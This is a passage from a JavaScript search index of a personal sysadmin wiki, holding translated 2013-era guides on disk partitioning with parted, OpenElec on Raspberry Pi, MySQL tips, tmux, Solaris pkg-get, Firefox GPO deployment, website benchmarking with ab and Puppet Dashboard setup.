                content: " Software version 2.1 Operating System Debian 6\nRed Hat 6.3 Last Update 13/02/2013 Introduction linkGNU Parted is a program for creating, destroying, resizing, checking, and copying partitions, and the file systems on them. This is useful for creating space for new operating systems, reorganizing hard disk usage, copying data between hard disks, and disk imaging. It was written by Andrew Clausen and Lennert Buytenhek.\nIt consists of a library, libparted, and a command-line frontend, parted, that also serves as reference implementation.\nCurrently, Parted runs only under Linux, GNU/Hurd, FreeBSD and BeOS.\nProblem Statement linkYou may have just acquired a disk array (SATA, SAS…) and are encountering partitioning issues. For example, you might not be able to create partitions larger than 99GB or 2TB. This is what happened to me. And in your boot logs (dmesg), you might see errors like:\nsdb : very big device. try to use READ CAPACITY(16). Losing some ticks... checking if CPU frequency changed. SCSI device sdb: 8784445440 512-byte hdwr sectors (4497636 MB) sdb: Write Protect is off sdb: Mode Sense: 1f 00 10 08 SCSI device sdb: drive cache: write through w/ FUA sdb: sdb1 sdb : very big device. try to use READ CAPACITY(16). SCSI device sdb: 8784445440 512-byte hdwr sectors (4497636 MB) sdb: Write Protect is off sdb: Mode Sense: 1f 00 10 08 SCSI device sdb: drive cache: write through w/ FUA sdb: sdb : very big device. try to use READ CAPACITY(16). SCSI device sdb: 8784445440 512-byte hdwr sectors (4497636 MB) sdb: Write Protect is off sdb: Mode Sense: 1f 00 10 08 SCSI device sdb: drive cache: write through w/ FU You likely partitioned with fdisk or cfdisk. And that’s where your error lies! Apparently, these tools still have difficulty handling large capacities. That’s why I’m recommending parted :-)\nInstallation linkQuite simple:\napt-get install parted Partitioning linkWizard linkMy partitioning is fairly simple; I want to create a single 4.5TB disk. First, I check that I don’t have any existing partitions and I begin:\n$ parted GNU Parted 1.7.1 Using /dev/sda Welcome to GNU Parted! Type 'help' to view a list of commands. (parted) p Disk /dev/sda: 145GB Sector size (logical/physical): 512B/512B Partition Table: msdos Number Start End Size Type File system Flags 1 32,3kB 41,1MB 41,1MB primary fat16 2 41,1MB 173MB 132MB primary ext3 boot 3 173MB 145GB 145GB primary lvm Here we can see that I’m on my first disk (sda) and not on my array (sdb). Let’s switch to it:\n(parted) select /dev/sdb Using /dev/sdb Let’s create a label:\n(parted) mklabel New disk label type? [msdos]? gpt Next, create the partition:\n(parted) mkpart Partition name? []? san # Give any name you want File system type? [ext2]? ext3 # The filesystem Start? 0 # The beginning of your disk End? -1 # -1 corresponds to the end For those who want to use LVM, simply add a flag:\nset 1 lvm on Command line linkIf you want to do everything from the command line, for example to automate the process, here’s how. I’ve made a small script that creates a partition taking up the entire disk and optimizes it (via disk alignment) for the best performance:\ndatas_device=/dev/sdb parted -s -a optimal $datas_device mklabel gpt parted -s -a optimal $datas_device mkpart primary ext4 0% 100% parted -s $datas_device set 1 lvm on Line 1: we create a gpt-type label for large partitions (greater than 2TB) Line 2: we create a partition that takes up the entire disk Line 3: we indicate that this partition will be LVM type Validation linkWe can see the result:\n(parted) p Disk /dev/sdb: 4498GB Sector size (logical/physical): 512B/512B Partition Table: gpt Number Start End Size File system Name Flags 1 17,4kB 4498GB 4498GB ext3 san Everything looks good. I can exit:\n(parted) q And verify once more:\n$ cat /proc/partitions major minor #blocks name 8 0 142082048 sda 8 1 40131 sda1 8 2 128520 sda2 8 3 141910177 sda3 8 16 4392222720 sdb 8 17 4392222686 sdb1 254 0 2097152 dm-0 254 1 20971520 dm-1 254 2 20971520 dm-2 254 3 20971520 dm-3 254 4 76894208 dm-4 Formatting linkAll that’s left is to format it in the desired format (ext3 in this case):\nmkfs.ext3 /dev/sdb1 Maximum Filesystem Sizes link Filesystem Maximum partition size Maximum file size ext2 8 TB 2 GB ext3 8 TB 2 TB ext4 1024 PB Resiser4 8 TB ZFS 16 EB 16 EB "
            }
        );
    index.add(
            {
                id:  276 ,
                href: "\/OpenElec_:_Solution_multimedia_pour_Raspberry_Pi\/",
                title: "OpenElec: Multimedia Solution for Raspberry Pi",
                description: "Guide on installing and configuring OpenElec multimedia center on Raspberry Pi with support for remote controls and hardware video decoding.",
                content: " Software version 3.0 (2.99.2) Operating System Linux Website OpenElec Website Last Update 12/02/2013 Others Raspberry Pi B Introduction linkOpenELEC is an embedded GNU/Linux distribution aimed at allowing the use of a media center (HTPC — Home Theatre PC) in the same way as any other device connected to your television, such as a DVD player or external digital TV receiver. Turn on your device and OpenELEC is ready to use in less than 10 seconds — as fast as some DVD players. All you need is a simple remote control to access its functions.\nThe Raspberry Pi is a single-board computer with an ARM processor designed by game inventor David Braben as part of his Raspberry Pi Foundation. The computer is the size of a credit card, it allows the execution of several variants of the free GNU/Linux operating system and compatible software. It is supplied bare (motherboard only, without case, power supply, keyboard, mouse or screen) with the aim of reducing costs and allowing the use of recovered hardware. This computer is intended to encourage learning computer programming. However, it is sufficiently open (USB and network ports) and powerful (ARM 700 MHz, 256 MB of RAM for the original model, 512 MB on the latest versions) to allow a wide range of uses. Its BMC Videocore 4 graphics circuit in particular can decode full HD Blu-ray streams (1080p 30 frames per second), emulate old consoles, and run relatively recent video games.\nWe will see here how to set up OpenElec on Raspberry Pi and add some features.\nInstallation linkTo install OpenElec on Raspberry Pi, you first need to download the latest version, then decompress it:\nwget http://openelec.tv/get-openelec/download/finish/10-raspberry-pi-builds/30-openelec-testing-raspberry-pi-arm tar -xf 30-openelec-testing-raspberry-pi-arm Now, insert your SD card into your computer’s reader, check the name of the associated device:\ndmesg Then build the system using the provided script:\ncd OpenELEC-RPi.arm-2.99.2 ./create_sdcard /dev/sdb Now you can install the SD card in the Raspberry Pi, boot it and connect to it via SSH:\nroot/openelec Configuration linkFor the configuration part, there are several things that need to be done. First, you should know that if you look at the displayed total memory, it’s 380 MB by default because the video card shares its memory with RAM.\nLogitech Harmony One linkAt the time of writing, the remote control works perfectly with an IR605Q Dongle and a stable version of OpenElec. With development versions, this is less reliable, so pay attention to the version you choose!\nFor setup, using the “Logitech Harmony Remote Software” tool, configure a new “Device” as follows:\nDevice: Computer -\u003e Media PC Manufacturer: Microsoft Model: MCE-1039 Then access your OpenElec via SSH:\nLogin: root Password: openelec And create this file:\nXBMC.ReloadSkin() Screenshot FullScreen ToggleWatched SendClick(25,14) XBMC.CleanLibrary(video) XBMC.UpdateLibrary(video) AudioDelayMinus AudioDelayPlus ZoomOut ZoomIn Close Close Then restart your OpenElec and the remote control will work :-)\nHardware MPEG-2/VC-1 video decoding linkIt’s more efficient to decode MPEG-2 and VC-1 format videos using hardware rather than software since there is a dedicated chip for this in the Raspberry Pi. The problem is that you need to purchase licenses to be allowed to do this. Fortunately, they are not expensive. Go to the Raspberry Pi website and purchase them.\nYou will be asked for your Raspberry Pi’s serial number. To retrieve it:\n\u003e cat /proc/cpuinfo Processor\t: ARMv6-compatible processor rev 7 (v6l) BogoMIPS\t: 697.95 Features\t: swp half thumb fastmult vfp edsp java tls CPU implementer\t: 0x41 CPU architecture: 7 CPU variant\t: 0x0 CPU part\t: 0xb76 CPU revision\t: 7 Hardware\t: BCM2708 Revision\t: 000e Serial\t: 0000000000000000 Then you just need to insert the codes in this file (/flash/config.txt):\n[...] ################################################################################ # License keys to enable GPU hardware decoding for various codecs # to obtain keys visit the shop at http://www.raspberrypi.com ################################################################################ decode_MPG2=0x00000000 decode_WVC1=0x00000000 [...] Restart and you’re done.\nBacking Up Your Configuration linkYou may want to backup your entire configuration. This is very simple, everything is in file format, so you just have to copy it wherever you want. The configuration folder is located at:\n/storage/.xbmc When you want to restore, you just need to copy the same folder to the same location.\nReferences link http://linuxfr.org/news/openelec-2-0-annonce http://fr.wikipedia.org/wiki/Raspberry_Pi "
            }
        );
    index.add(
            {
                id:  277 ,
                href: "\/Utilisation_de_MySQL\/",
                title: "Using MySQL",
                description: "Tips and tricks for MySQL database management including charset conversion and table prefix manipulation",
                content: "Introduction linkHere are some solutions that will hopefully save you time.\nConverting a Latin1 Database to UTF8 linkHere’s the magic command:\nmysqldump --add-drop-table -uroot -p \"DB_name\" | replace CHARSET=latin1 CHARSET=utf8 | iconv -f latin1 -t utf8 | mysql -uroot -p \"DB_name\" Adding a Prefix to All Tables in a Database linkHere’s how to add a prefix to all tables in a database:\nSELECT Concat('ALTER TABLE ', TABLE_NAME, ' RENAME TO my_prefix_', TABLE_NAME, ';') FROM information_schema.TABLES WHERE table_schema = 'my_database' You just need to replace:\nmy_prefix: with your desired prefix my_database: with the desired database References link https://steindom.com/articles/adding-prefix-all-tables-mysql-database "
            }
        );
    index.add(
            {
                id:  278 ,
                href: "\/Tmux_:_le_multiplexeur_de_terminal_rempla%C3%A7ant_de_screen\/",
                title: "Tmux: The Terminal Multiplexer Replacing Screen",
                description: "Guide to installing, configuring and using Tmux, a powerful terminal multiplexer which serves as a modern replacement for screen.",
                content: "Introduction linkTmux has many advantages over screen and serves as a terminal multiplexer. This functionality is extremely practical and even essential once you’ve started using it.\nInstallation link aptitude install tmux Usage linkTo use tmux, simply launch it:\ntmux Like screen, tmux uses a key combination to access its internal functions. By default, it’s “Ctrl+b” (which can be modified) that is used. To start, you can easily get help (don’t forget to press “Ctrl+b” before pressing any key):\nDescription Keys Get help ? Window Management linkYou can manage your windows as follows (don’t forget to press “Ctrl+b” before pressing any key):\nDescription Keys Create a new window c Get a list of open windows w Move to the next window n Move to the previous window p Move to the last used window l Move to a window by its number 0 1 2 3 4 5 6 7 8 9 Search in window buffers f then “window search name” Rename the current window , Force close a window \u0026 Display time t Split linkYou can split the screen in several ways:\nDescription Keys Horizontally split the screen \" Vertically split the screen % Move to the previous pane { Move to the next pane } or o Move to the pane corresponding to the key ← → ↑ ↓ Get pane numbers q Change visual organization of panes [space] Resize a pane Alt+(← → ↑ ↓) Convert a pane from a split into a window ! Convert a window for integration into a split\n_ -h: horizontally\n_ -s 0.0: window 0 and pane 0\n* -p 75: taking 75% of window :joinp -h -s 0.0 -p 75 History linkBy default, Tmux keeps only 2000 lines of history. Here’s how to navigate:\nDescription Keys Scroll up through history ↑↑ (PageUP) Scroll down through history after scrolling up ↓↓ (PageDOWN) Select lines from history (after PageUP) [space] then (↑/↓) Copy selection [enter] Paste selection = Sessions linkSession management is something very practical. It’s always useful to be able to exit an SSH session and leave time-consuming tasks running, or to protect against network disconnections. That’s why when you’re in tmux, it’s possible to detach from your tmux:\nDescription Keys Detach from tmux session d List tmux sessions s Switch to next tmux session ) Switch to previous tmux session ( Then reattach later:\ntmux a This command also allows multiple participants to see exactly the same thing.\nCheat Sheet linkI’ve created a cheat sheet for those interested:\nTmux Cheat Sheet PDF French - LaTeX Fr Tmux Cheat Sheet PDF English - LaTeX En Customization linkYou can customize all kinds of things (I’ll let you read the man page as it’s so complete), and here’s my configuration:\n# Tmux configuration # Pierre Mavro # Default shell set -g default-command zsh # Screen addict (replacing Ctrl+b by Ctrl+a) #set -g prefix C-a #unbind C-b #bind C-a send-prefix # Enable utf8 set -g status-utf8 on setw -g utf8 on # Same hack as screen to scroll terminal (xterm ...) set -g terminal-overrides 'xterm*:smcup@:rmcup@' # Scrollback buffer n lines set -g history-limit 100000 # Lock session after delay (in seconds) set -g lock-after-time 720 # Use vlock to lock session (aptitude install vlock) set -g lock-command vlock # To unlock as a user #vlock -a # To unlock as root #vlock -sn # Highlight active window set-window-option -g window-status-current-bg red # Split easier keys (| for horizontal and - for vertical) bind | split-window -h bind - split-window -v # Set window notifications when somethings new happen setw -g monitor-activity on set -g visual-activity on #set -g visual-bell on # Start window to number to 1 (default 0) set -g base-index 1 # Automatically set window title setw -g automatic-rename # force resize local window #setw -g aggressive-resize on # Enable mouse #set -g mouse-select-pane on #setw -g mode-mouse on Launch a Program with Tmux at Boot linkYou may want to launch weechat (IRC client) or other program in tmux when your machine starts. To do this, it’s easy:\nsu - deimos -c \"tmux new-session -d 'weechat-curses'\" Here we’re asking tmux to create a new session via the deimos user.\nResources link http://tmux.sourceforge.net/ http://myhumblecorner.wordpress.com/2011/08/30/screen-to-tmux-a-humble-quick-start-guide/ http://blog.hawkhost.com/2010/06/28/tmux-the-terminal-multiplexer/ http://blog.hawkhost.com/2010/07/02/tmux-%E2%80%93-the-terminal-multiplexer-part-2/ http://www.dayid.org/os/notes/tm.html http://tmux.svn.sourceforge.net/viewvc/tmux/trunk/examples/ http://linux-attitude.fr/post/configuration-de-tmux?utm_source=rss\u0026utm_medium=rss\u0026utm_campaign=configuration-de-tmux "
            }
        );
    index.add(
            {
                id:  279 ,
                href: "\/Pkg-get_:_Mise_en_place_d%27un_syst%C3%A8me_de_repository_pour_Solaris\/",
                title: "Pkg-get: Setting up a Repository System for Solaris",
                description: "This guide explains how to set up a repository system using pkg-get for Solaris to easily install packages.",
                content: "Introduction linkPackage installation in Solaris is quite basic by default, and recompiling sources is not always simple or fast. This is why I suggest using pkg-get, which is a very practical utility that allows you to install your desired packages for Solaris (SPARC or x86) in just a few seconds or minutes.\nInstallation linkNew Method linkThe new method makes things much simpler:\npkgadd -d http://get.opencsw.org/now Then add /opt/csw/bin to your path:\nexport PATH=$PATH:/opt/csw/bin And that’s it :-)\nOld Method linkFirst, you need wget! I suggest downloading it from these URLs:\nx86: http://www.blastwave.org/wget-i386.bin SPARC: http://www.blastwave.org/wget-sparc.bin Then place it in the /usr/bin/ directory of your Solaris. Rename it to wget to simplify the task:\nmv /usr/bin/wget-i386.bin /usr/bin/wget chmod 755 /usr/bin/wget Next, add /opt/csw/bin to your path:\nexport PATH=$PATH:/opt/csw/bin This is obviously a temporary solution for your PATH, but I recommend adding it to the /etc/profile file:\necho \"export PATH=$PATH:/opt/csw/bin\" \u003e\u003e /etc/profile You should also have gzip installed (normally it’s included by default, but I prefer to specify it…). Now that wget is installed, we just need to download pkg_get:\nwget http://www.blastwave.org/pkg_get-3.8-all-CSW.pkg And let’s proceed with the installation:\npkgadd -d pkg_get-3.8-all-CSW.pkg In response to the questions, answer all and yes every time :-).\nConfiguration linkLet’s edit the /opt/csw/etc/pkg-get.conf file to select the most appropriate mirror from this list.\nUsage linkNow that everything is set up, we can use it. First, update the list of available packages using pkg-get or pkgutil (depending on the version of opencsw you have):\npkg-get -U or\npkgutil -U To search (for example, for vim), use this command:\npkg-get -a And then to install it:\npkg-get install vim or\npkgutil -i vim It’s not complicated and saves a tremendous amount of time :-)\n"
            }
        );
    index.add(
            {
                id:  280 ,
                href: "\/Firefox_mass_management_on_Windows\/",
                title: "Firefox: Mass Management on Windows Environment",
                description: "Learn how to manage Firefox deployments in a Windows Active Directory environment using GPO for Firefox.",
                content: " Software version 17+ Operating System Windows 2003 RC2\nWindows 7 Website Firefox Website Last Update 22/01/2013 Others Introduction linkYou probably manage your Internet Explorer configuration via GPO under Active Directory. This is convenient, there are plenty of options, but logically there is nothing by default for alternative browsers.\nThe first issue you will encounter is the lack of MSI by default. You have 2 options:\nUse SCCM1 (formerly SMS) to deploy .exe files Use repackaged versions in MSI format2 and deploy them via GPO. We will use the first option here because SCCM allows you to do much more than classic GPO deployments. However, we won’t cover how to set up deployment via SCCM or GPO as tutorials are plentiful on the internet, and we’ll focus on the Firefox part.\nWe will use the Firefox plugin called GPO for Firefox3. This plugin allows Firefox, when launched, to look at registry properties (which will have been pushed by GPO) to force default values in Firefox’s “about:config” and make them non-modifiable by the user.\nIt’s possible to go a bit further with Firefox repackaging by implementing additional default features via the CCK plugin4.\nPrerequisites linkFor the prerequisites, we’ll need at minimum:\nAn Active Directory + DNS server An SCCM server A Windows 7 client Installation linkFirefox linkAdd the Firefox extension “GPO for Firefox”5 by repackaging it if possible so that it’s installed by default.\nGPO on AD linkWe’ll install the GPOs on the server where Active Directory is located. First, download the file containing the new GPO entries for Firefox: https://sourceforge.net/projects/gpofirefox/files/firefox.adm/download6\nThen launch the Users and Computers interface: We’ll install the GPO at the domain level, but you can also do it at the GPO level if you wish. Go to domain properties: Here’s the procedure to follow: Click on the GPO tab (Group Policy) Add a new GPO Name it in a recognizable way Click Edit to edit it Now we’ll add the firefox.adm file to access the new options. Position yourself on “Administrative Templates” and click on “Add/Remove Templates”: Add the firefox.adm file: Then you should now see it appear: Configuration linkConfiguration of the GPO linkConfiguring the GPO is quite simple once you understand the principle. It’s possible to force certain Firefox properties from the GPOs on the user or computer side. You can choose what works best for you. Depending on what you choose, the user-side parameters that will be in the registry can be found here:\nHKLM or HKCU\\Software\\Policies\\Mozilla\\LockPref for locked preferences HKLM or HKCU\\Software\\Policies\\Mozilla\\defaultPref for default preferences One of the first parameters to apply is the following: activating the GPOFirefox module:\nWe activate it and hide it from the list of classic applications:\nYou have the ability to access most of the functions present in “about:config” in the “Mozilla Advanced Options” folder.\nReferences link http://fr.wikipedia.org/wiki/System_Center_Configuration_Manager ↩︎\nhttp://www.frontmotion.com/Firefox/download_firefox.htm ↩︎\nhttps://addons.mozilla.org/en-us/firefox/addon/gpo-for-firefox/ ↩︎\nhttps://addons.mozilla.org/fr/firefox/addon/cck ↩︎\nhttps://addons.mozilla.org/fr/firefox/addon/gpo-for-firefox/ ↩︎\nhttp://sourceforge.net/projects/gpofirefox/files/firefox.adm/download ↩︎\n"
            }
        );
    index.add(
            {
                id:  281 ,
                href: "\/Benchmarker_son_site_web\/",
                title: "Benchmark Your Website",
                description: "How to benchmark your website to test its performance and understand how it behaves under load",
                content: " Software version 2.3 Operating System Ubuntu 12.10 Website Apache Website Last Update 16/01/2013 Others Server: Debian 7 Introduction linkIt’s useful to know how many connections your web server can handle. It’s important to see how your server behaves under load. That’s why it’s necessary to benchmark it. We’ll see here how to benchmark it, and then we’ll look at some differences when using cache servers.\nFor my tests, I started with an Nginx server, then added a Varnish server in front.\nInstallation linkFor benchmarking, there’s the ab command (Apache Benchmark). To install it:\naptitude install apache2-utils Running benchmarks linkHere’s how to use the ab command:\nab -c -t occurrences: defines the number of parallel requests time: the time (in seconds) that the tests should run website: the website to benchmark (use a complete address, like an index.php or index.html) The tests below are conducted between a server with a 1Gb/s bandwidth and a client with 100Mb/s through the Internet. However, it’s important to understand that the source of your tests is extremely important. Indeed, a local network or loopback will be much more telling in terms of benchmarks than an Internet network.\ninfo I recommend doing your benchmarks on loopback if you have the possibility Wordpress linkHere’s the command I used to benchmark my blog:\n\u003e ab -c 5 -t 30 http://blog.deimos.fr/index.php This is ApacheBench, Version 2.3 \u003c$Revision: 655654 $\u003e Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking blog.deimos.fr (be patient) Completed 5000 requests Completed 10000 requests Finished 11072 requests Server Software: nginx Server Hostname: blog.deimos.fr Server Port: 80 Document Path: /index.php Document Length: 0 bytes Concurrency Level: 5 Time taken for tests: 30.003 seconds Complete requests: 11072 Failed requests: 0 Write errors: 0 Non-2xx responses: 11072 Total transferred: 2911936 bytes HTML transferred: 0 bytes Requests per second: 369.03 [#/sec] (mean) Time per request: 13.549 [ms] (mean) Time per request: 2.710 [ms] (mean, across all concurrent requests) Transfer rate: 94.78 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 4 6 3.5 6 109 Processing: 4 7 12.6 7 388 Waiting: 4 7 12.6 7 388 Total: 9 14 13.1 13 395 Percentage of the requests served within a certain time (ms) 50% 13 66% 13 75% 14 80% 14 90% 14 95% 14 98% 15 99% 16 100% 395 (longest request) Here, the server is capable of handling 369 requests per second. That’s pretty good, but the CPU on the server side was close to 80%.\nNow, let’s add a cache server like Varnish, then run the benchmarks again:\n\u003e ab -c 5 -t 30 http://blog.deimos.fr/index.php This is ApacheBench, Version 2.3 \u003c$Revision: 655654 $\u003e Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking blog.deimos.fr (be patient) Completed 5000 requests Completed 10000 requests Finished 12541 requests Server Software: nginx Server Hostname: blog.deimos.fr Server Port: 80 Document Path: /index.php Document Length: 0 bytes Concurrency Level: 5 Time taken for tests: 30.000 seconds Complete requests: 12541 Failed requests: 0 Write errors: 0 Non-2xx responses: 12541 Total transferred: 4548468 bytes HTML transferred: 0 bytes Requests per second: 418.03 [#/sec] (mean) Time per request: 11.961 [ms] (mean) Time per request: 2.392 [ms] (mean, across all concurrent requests) Transfer rate: 148.06 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 3 5 8.1 5 390 Processing: 4 7 8.6 6 390 Waiting: 4 6 8.6 6 390 Total: 8 12 11.9 11 396 Percentage of the requests served within a certain time (ms) 50% 11 66% 12 75% 12 80% 12 90% 13 95% 13 98% 14 99% 14 100% 396 (longest request) We get a decent gain, the big difference is that the CPU is below 20% with Varnish!\nMediawiki linkI also benchmarked the wiki. Again, the CPU was overloaded without a cache server and the information speaks for itself:\n\u003e ab -c 5 -t 30 http://wiki.deimos.fr/index.php This is ApacheBench, Version 2.3 \u003c$Revision: 655654 $\u003e Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking wiki.deimos.fr (be patient) Finished 2442 requests Server Software: nginx Server Hostname: wiki.deimos.fr Server Port: 80 Document Path: /index.php Document Length: 0 bytes Concurrency Level: 5 Time taken for tests: 30.000 seconds Complete requests: 2442 Failed requests: 0 Write errors: 0 Non-2xx responses: 2442 Total transferred: 1015872 bytes HTML transferred: 0 bytes Requests per second: 81.40 [#/sec] (mean) Time per request: 61.425 [ms] (mean) Time per request: 12.285 [ms] (mean, across all concurrent requests) Transfer rate: 33.07 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 3 6 9.2 5 352 Processing: 19 56 32.0 54 410 Waiting: 19 56 32.0 54 409 Total: 26 61 34.8 59 761 Percentage of the requests served within a certain time (ms) 50% 59 66% 61 75% 62 80% 63 90% 65 95% 69 98% 94 99% 166 100% 761 (longest request) And with Varnish:\n\u003e ab -c 5 -t 30 http://wiki.deimos.fr/index.php This is ApacheBench, Version 2.3 \u003c$Revision: 655654 $\u003e Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ Benchmarking wiki.deimos.fr (be patient) Completed 5000 requests Completed 10000 requests Finished 10691 requests Server Software: nginx Server Hostname: wiki.deimos.fr Server Port: 80 Document Path: /index.php Document Length: 0 bytes Concurrency Level: 5 Time taken for tests: 30.002 seconds Complete requests: 10691 Failed requests: 0 Write errors: 0 Non-2xx responses: 10691 Total transferred: 5149681 bytes HTML transferred: 0 bytes Requests per second: 356.34 [#/sec] (mean) Time per request: 14.032 [ms] (mean) Time per request: 2.806 [ms] (mean, across all concurrent requests) Transfer rate: 167.62 [Kbytes/sec] received Connection Times (ms) min mean[+/-sd] median max Connect: 4 6 11.9 6 391 Processing: 5 8 10.9 7 391 Waiting: 5 7 10.9 7 391 Total: 10 14 16.2 13 398 Percentage of the requests served within a certain time (ms) 50% 13 66% 13 75% 14 80% 14 90% 14 95% 15 98% 16 99% 16 100% 398 (longest request) "
            }
        );
    index.add(
            {
                id:  282 ,
                href: "\/Puppet_Dashboard_:_Mise_en_place_d\u0027une_interface_graphique_pour_Puppet\/",
                title: "Puppet Dashboard: Setting up a Graphical Interface for Puppet",
                description: "How to install, configure and use Puppet Dashboard to create a graphical interface to monitor Puppet nodes and reports.",
                content: " Software version 1.2.17 Operating System Debian 7 Website Puppet Dashboard Website Last Update 05/01/2013 Others Clients OS:\nDebian 6/7\nRHEL 6 Introduction linkPuppet is great, but a web interface would be amazing to see the status of machines, synchronizations, etc.\nSo I suggest setting up Puppet Dashboard.\nInstallation linkFor Debian, we’ll use the official repository:\nwget http://apt.puppetlabs.com/puppetlabs-release-stable.deb dpkg -i puppetlabs-release-stable.deb And then, we update:\naptitude update Next, we can simply install the dashboard with all its dependencies:\naptitude install puppet-dashboard mysql-server Configuration linkDaemon linkWe’ll enable Puppet Dashboard to run automatically at startup by uncommenting the “start” line:\n# IMPORTANT: Be sure you have checked the values below, appropriately # configured 'config/database.yml' in your DASHBOARD_HOME, and # created and migrated the database. # Uncomment the line below to start Puppet Dashboard. START=yes # Location where puppet-dashboard is installed: DASHBOARD_HOME=/usr/share/puppet-dashboard # User which runs the puppet-dashboard program: DASHBOARD_USER=www-data # Ruby version to run the puppet-dashboard as: DASHBOARD_RUBY=/usr/bin/ruby # Rails environment in which puppet-dashboard runs: DASHBOARD_ENVIRONMENT=production # Network interface which puppet-dashboard web server is running at: DASHBOARD_IFACE=0.0.0.0 # Port on which puppet-dashboard web server is running at, note that if the # puppet-dashboard user is not root, it has to be a \u003e 1024: DASHBOARD_PORT=3000 We’ll also use Delayed Job Workers to ensure data arrives in full even when there’s high demand on the Dashboard:\n# IMPORTANT: Be sure you have checked the values below, appropriately # configured 'config/database.yml' in your DASHBOARD_HOME, and # created and migrated the database. . /etc/default/puppet-dashboard START=yes # Number of dashboard workers to start. This will be the number of jobs that # can be concurrently processed. A simple recommendation would be to start # with the number of cores you have available. NUM_DELAYED_JOB_WORKERS=2 You can also adjust the NUM_DELAYED_JOB_WORKERS parameter if needed.\nMySQL linkTo start, we need to initialize the database with the mysql*secure_installation command (for more information, see this documentation). Now we can create a MySQL database and a dedicated user:\nCREATE DATABASE puppet_dashboard CHARACTER SET utf8; CREATE USER 'puppetdash_user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON puppet_dashboard.* TO 'puppetdash_user'@'localhost'; flush privileges; We’ll modify the MySQL configuration to increase the maximum packet size by adjusting a value. Edit your MySQL configuration in the ‘mysqld’ section and set max_allowed_packet to at least 32M:\n[...] [mysqld] # Puppet Dashboard requirements: # Allowing 32MB allows an occasional 17MB row with plenty of spare room max_allowed_packet = 32M [...] Then restart MySQL.\nNow we’ll modify the default configuration to match our new MySQL database and user. Edit the production section in the following configuration file:\n... production: database: puppet_dashboard username: puppetdash_user password: password host: localhost encoding: utf8 adapter: mysql ... Now we can initialize the database:\ncd /usr/share/puppet-dashboard rake RAILS_ENV=production db:migrate You can now start the puppet-dashboard service if you want, and the console is accessible at http://puppet-dashboard:3000\nPuppet Master linkFor Puppet Master, we need to tell it to send reports not just as files (in the /var/lib/puppet/reports directory), but also to the MySQL database. To do this, edit the configuration file and add this:\n[...] [master] reportdir = /var/lib/puppet/reports reporturl = http://localhost:3000/reports/upload reports = http,store,log node_terminus = exec external_nodes = /usr/bin/env PUPPET_DASHBOARD_URL=http://localhost:3000 /usr/share/puppet-dashboard/bin/external_node [...] Replace localhost with your server name.\nThen restart the puppetmaster and puppet-dashboard services.\nPuppet Clients linkFor the client part, we need to tell it to send a report to the server:\n... [agent] report = true ... Nginx linkIf like me you use your Puppet Dashboard on the same machine as Puppet Master, it’s cleaner to hide Puppet Dashboard’s port 3000. For this, we’ll use a proxy with Nginx:\nupstream puppet-prd-dash.deimos.fr:3000 { server unix:/usr/share/puppet-dashboard/tmp/sockets/dashboard.0.sock; server unix:/usr/share/puppet-dashboard/tmp/sockets/dashboard.1.sock; server unix:/usr/share/puppet-dashboard/tmp/sockets/dashboard.2.sock; } server { root /usr/share/puppet-dashboard/public; location / { proxy_pass http://puppet-prd-dash.deimos.fr:3000; } } And we enable the new configuration:\ncd /etc/nginx/sites-available ln -s /etc/nginx/sites-enabled/puppet-dashboard . /etc/init.d/nginx restart Then restart Nginx.\nCrontab linkTo avoid performance issues as the database fills up, it’s better to purge and optimize it afterwards. We’ll create a crontab for this work to be done every month:\n#!/bin/sh # # puppet-dashboard cron monthly set -e PUPPETDASH_HOME=/usr/share/puppet-dashboard cd $PUPPETDASH_HOME # Flush DB old reports older than 1 month su - www-data -c \"cd $PUPPETDASH_HOME ; rake RAILS_ENV=production reports:prune upto=1 unit=mon\" # Optmize table rake RAILS_ENV=production db:raw:optimize exit 0 We assign it the correct permissions:\nchmod 755 /etc/cron.monthly/puppet-dashboard Importations linkPuppet Nodes linkIf you want to import all Puppet nodes at once into your Dashboard without waiting for synchronization:\ncd /usr/share/puppet-dashboard for i in $(puppetca -la | awk -F\\\" '{ print $2 }' | grep -v `hostname`) ; do rake RAILS_ENV=production node:add name=$i ; done Reports linkIf you want to import the file reports you currently have into the database, it’s simple:\ncd /usr/share/puppet-dashboard rake RAILS_ENV=production reports:import REPORT_DIR=/var/lib/puppet/reports FAQ linkcannot load such file – ftools linkIf you get errors like this when importing the database schema:\n\u003e rake RAILS_ENV=production db:migrate NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01. Gem.source_index called from /usr/share/puppet-dashboard/vendor/rails/railties/lib/rails/gem_dependency.rb:21. NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01. Gem::SourceIndex#initialize called from /usr/share/puppet-dashboard/vendor/rails/railties/lib/rails/vendor_gem_source_index.rb:100. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01. Gem::SourceIndex#add_spec called from /usr/lib/ruby/1.9.1/rubygems/source_index.rb:91. NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on 